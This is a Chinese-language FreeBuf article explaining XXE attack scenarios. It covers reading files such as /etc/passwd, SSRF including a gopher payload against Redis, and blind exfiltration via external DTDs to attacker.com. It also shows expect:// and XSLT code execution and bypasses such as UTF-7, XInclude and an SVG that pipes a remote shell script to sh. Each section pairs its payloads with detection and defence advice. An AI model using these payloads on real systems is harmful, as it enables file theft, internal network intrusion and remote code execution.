---
title: XXE漏洞攻击场景的一些解析
url: https://www.freebuf.com/vuls/421770.html
source: FreeBuf网络安全行业门户
date: 2025-02-15
fetch_date: 2025-10-06T20:36:23.332379
---

# XXE漏洞攻击场景的一些解析

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

XXE漏洞攻击场景的一些解析

* ![]()
* 关注

* [漏洞](https://www.freebuf.com/articles/vuls)

XXE漏洞攻击场景的一些解析

2025-02-14 10:36:27

所属地 上海

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

## 1. 敏感文件泄露

**攻击原理**
通过XML外部实体引用本地文件系统路径，利用未正确配置的XML解析器读取服务器敏感文件

具体Payload示例

* **读取Linux系统文件：**

```
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&ampxxe</data>
```

* 利用条件：XML解析器允许file://协议，且应用返回错误信息或解析结果。

* **读取Windows文件：**

```
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
```

* **利用PHP包装器绕过限制：**

```
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

* 结果：文件内容以Base64编码形式返回，避免XML解析错误。

### 检测与防御

**检测：**

* 监控HTTP响应中是否包含文件内容（如root:x:0:0:）。
* 使用Burp Collaborator检测文件读取尝试。

**防御：**

* 禁用file://协议：setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
* 过滤XML中的<!DOCTYPE声明。

## 2. 服务端请求伪造（SSRF）

**攻击原理**
利用XML解析器发起任意HTTP请求，探测或攻击内网服务。

### Payload示例

* **探测内网HTTP服务：**

```
<!ENTITY xxe SYSTEM "http://192.168.1.1:8080/admin">
```

* **利用Gopher协议攻击Redis：**

```
<!ENTITY xxe SYSTEM "gopher://internal-redis:6379/_*2%0D%0A$4%0D%0AAUTH%0D%0A$5%0D%0Aadmin%0D%0A*3%0D%0A$3%0D%0ASET%0D%0A$5%0D%0Akey%0D%0A$5%0D%0Avalue%0D%0A">
```

* 结果：通过Gopher协议向Redis发送命令，触发未授权访问。
* **利用FTP外带数据：**

```
<!ENTITY % dtd SYSTEM "ftp://attacker.com:2121/data.dtd">
```

### **检测与防御** **检测：**

* 监控XML解析器发起的异常出站请求（如非预期IP的HTTP/FTP连接）。
* 使用网络层IDS规则：alert tcp any any -> any 8080 (msg:"XXE SSRF"; content:"GET /admin";)

**防御：**

* 禁用网络协议：setFeature("http://xml.org/sax/features/external-general-entities", false)
* 配置防火墙规则，禁止XML解析器进程访问内网。

## 3. 盲注XXE（数据外带）

### 攻击原理

当目标应用不直接返回数据时，通过DNS/HTTP请求将数据外传到攻击者服务器。

### Payload示例

基于DNS的数据外带：

```
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.com/dtd">
  %remote;
]>
```

**其中dtd内容：**

```
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%data;'>">
%exfil;
```

* **基于HTTP的参数外带：**

```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

**检测与防御**
**检测：**

* 分析DNS日志中的异常子域名查询（如7a68656c6c6f.attacker.com对应Hex编码的"zhello"）。
* 使用Burp Collaborator或Interactsh平台捕获外带请求。

**防御：**

* 禁用参数实体：setFeature("http://xml.org/sax/features/external-parameter-entities", false)
* 输入内容过滤：拦截%和&等实体声明符号

## 4. 远程代码执行（RCE）

### 攻击原理

在特定环境下（如PHP启用expect扩展），通过包装器直接执行系统命令。

**Payload示例**

* **PHP expect RCE：**

```
<!ENTITY xxe SYSTEM "expect://id">
```

* 响应：返回uid=0(root) gid=0(root)等命令结果。
* **Java XSLT RCE**：

```
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="http://attacker.com/exploit.xsl"?>
```

* exploit.xsl：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="runtime:exec(java.lang.Runtime.getRuntime(), 'calc.exe')"/>
  </xsl:template>
</xsl:stylesheet>
```

**检测与防御**
**检测：**

* 监控系统进程日志，如/var/log/auth.log中的异常命令执行。
* 使用HIDS（主机入侵检测系统）捕获可疑进程创建。

**防御**：

* 禁用危险包装器（如PHP的expect://）。
* 限制XSLT处理器的网络访问权限。

## 5.绕过手法

* **UTF-7编码绕过**

```
+ADw-+ACE-DOCTYPE root+AFs-
  +ADw-+ACE-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
+AD4-
```

* 防御：强制指定XML编码为UTF-8：<?xml version="1.0" encoding="UTF-8"?>
* **XInclude注入**

```
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

* 防御：禁用XInclude解析：setXIncludeAware(false)

**SVG/Office文档XXE**

* **恶意SVG文件：**

```
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="expect://curl http://attacker.com/shell.sh | sh"/>
</svg>
```

**防御：**

* 文件上传过滤：禁止上传包含<!ENTITY的文件。
* 使用沙箱解析用户上传的文档。

**总结：XEE攻击场景的防御需要结合协议禁用、输入过滤、日志监控的多层防护，并通过持续渗透测试验证防护效果。尤其需注意非显式XXE入口点（如Office文档、SVG图像），构建完整的文件上传安全策略。**

# 漏洞 # XXE攻击 # XXE漏洞 # XXE实战

![]()

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
已在FreeBuf发表 0 篇文章

本文为 独立观点，未经授权禁止转载。
如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf
客服小蜜蜂（微信：freebee1024）

被以下专辑收录，发现更多精彩内容

+ 收入我的专辑

+ 加入我的收藏

展开更多

相关推荐

![]()

关 注

* 0 文章数
* 0 关注者

文章目录

1. 敏感文件泄露

* 检测与防御

2. 服务端请求伪造（SSRF）

* Payload示例
* 检测与防御检测：

3. 盲注XXE（数据外带）

* 攻击原理
* Payload示例

4. 远程代码执行（RCE）

* 攻击原理

5.绕过手法

![](/images/logo_b.png)

本站由阿里云 提供计算与安全服务

### 用户服务

* [有奖投稿](https://www.freebuf.com/write)
* [提交漏洞](https://www.vulbox.com/bounties/detail-72)
* [参与众测](https://www.vulbox.com/projects/list)
* [商城](https://shop.freebuf.com)

### 企业服务

* [安全咨询](https://company.freebuf.com)
* [产业全景图](https://www.freebuf.com/news/307349.html)
* [企业SRC](https://www.vulbox.com/service/src)
* [安全众测](https://www.vulbox.com/)

### 合作信息

* [斗象官网](https://www.tophant.com/)
* [广告投放](https://www.freebuf.com/articles/444331.html)
* [联系我们](https://www.freebuf.com/articles/444332.html)

### 关于我们

* [关于我们](https://www.freebuf.com/news/others/864.html)
* 微信公众号
* [新浪微博](http://weibo.com/freebuf)

### 战略伙伴

* [![](https://image.3001.net/images/20191017/1571306518_5da83c1686dd9.png)](http://www.aliyun.com/?freebuf)

### FreeBuf知识大陆

![](https://image.3001.net/images/20250703/1751535036_68664dbcae34ac40bb9e7.png)

扫码把安全装进口袋

* [斗象科技](https://www.tophant.com/)
* [FreeBuf](https://www.freebuf.com)
* [漏洞盒子](https://www.vulbox.com/)
* [斗象智能安全](https://ai.tophant.com/)
* [免责条款](https://www.freebuf.com/dis)
* [协议条款](https://my.freebuf.com/AgreeProtocol/duty)

Copyright © 2025 WWW.FREEBUF.COM All Rights Reserved
[沪ICP备2024099014号](https://beian.miit.gov.cn/#/Integrated/index) | [沪公安网备
![](https://image.3001.net/images/20200106/1578291342_5e12d08ec2379.png)](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31011502009321)